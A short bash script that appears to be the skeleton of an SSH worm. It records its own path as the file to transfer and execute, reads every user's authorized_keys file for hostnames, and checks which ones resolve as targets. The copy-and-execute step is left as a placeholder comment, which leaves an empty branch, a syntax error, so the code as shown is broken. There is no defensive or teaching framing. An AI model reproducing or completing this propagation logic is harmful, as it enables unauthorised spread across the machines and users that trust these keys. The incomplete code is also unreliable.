#!/bin/bash

# File to be transferred and executed
file_to_transfer="$0"

# Loop through each user's home directory
for dir in /home/*; do
  # Check if .ssh/authorized_keys file exists
  if [[ -f "$dir/.ssh/authorized_keys" ]]; then
    # Extract hostnames from the authorized_keys file
    awk '{print $3}' "$dir/.ssh/authorized_keys" | while read -r hostname; do
      if [[ ! -z "$hostname" ]]; then
        # Check if hostname resolves
        nslookup "$hostname" &>/dev/null
        if [[ $? -eq 0 ]]; then
          # Continue with SSH and SCP operations
          # ...
        else
          echo "Hostname $hostname could not be resolved."
        fi
      fi
    done
  fi
done
